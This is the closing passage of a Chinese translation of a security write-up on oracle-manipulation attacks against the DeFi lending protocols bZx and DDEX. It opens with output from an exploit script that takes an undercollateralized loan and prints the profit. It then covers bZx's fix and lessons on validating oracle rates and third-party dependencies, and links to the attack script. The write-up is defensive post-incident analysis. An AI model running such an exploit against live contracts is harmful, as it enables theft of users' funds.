making order totalSupply=8856.102959786215028808 borrowed=7970.492663807593525927
##### calling: checkRates()
checking rates tokens=10.000000000000000000 rate=5.656379870360426078 slippage=5.486688474249613295
##### calling: borrow()
collateral_required=702.265284613341236862, interest_required=205.433213643594588344
borrowing loanHash=0x947839881794b73d61a0a27ecdbe8213f543bdd4f4a578eedb5e1be57221109c
##### calling: cleanup()
##### calling: checkProfits()
profits=2425.711777227580307468
#### finished executing step: exploit
*/
```

#### 使用解决方案

bZx团队针对上一次攻击还原了其更改，而是实施了价差检查，这样，如果价差超过某个特定阈值，则贷款将被拒绝。

只要查询的两个代币在Kyber上具有至少一个不可操纵的储备金，该解决方案就可以处理通用情况，当前所有白名单代币都属于这种情况。

##  关键要点

### 不要使用未经验证的链上去中心化预言机

由于链上去中心化预言机的性质，请确保你正在验证返回的汇率，无论是通过下订单(从而抵消可能实现的任何收益)，将汇率与已知的良好汇率进行比较，或者比较两个方向的费率。

### 考虑第三方依赖的影响

在这两种情况下，DDEX和bZx都假定Uniswap和Kyber将成为准确价格数据的来源。但是，DEX的准确汇率意味着可以使用该汇率进行交易，而DeFi项目的准确汇率意味着它接近或等于FMV。换句话说，DeFi项目的准确汇率可以作为DEX的准确汇率，但是反过来却不可以。

此外，由于对Kyber网络内部如何计算两个非ETH代币之间的汇率的有误解，bZx为解决该问题所做的第二次更改是不够的。

因此，在引入对第三方项目的依赖之前，不仅要考虑该项目是否已经过审核，还需要考虑项目的规格和威胁模型是否与你自己的一致。如果有时间，深入了解他们的合约也不会有任何伤害。

## 进一步阅读

* [bZx的披露](https://medium.com/@b0xNet/your-funds-are-safe-d35826fe9a87)
* [DDEX的披露](https://medium.com/ddex/fixed-potential-vulnerability-in-contract-used-during-private-beta-217c0ed6f694)
* [本文使用的脚本](https://gist.github.com/samczsun/c20119b80f6f7f0a8e197666e0a2b1c9) （[备用链接](https://gitee.com/lbc-team/undercollateralized-loans)）


------

本翻译由 [Cell Network](https://www.cellnetwork.io/?utm_souce=learnblockchain) 赞助支持。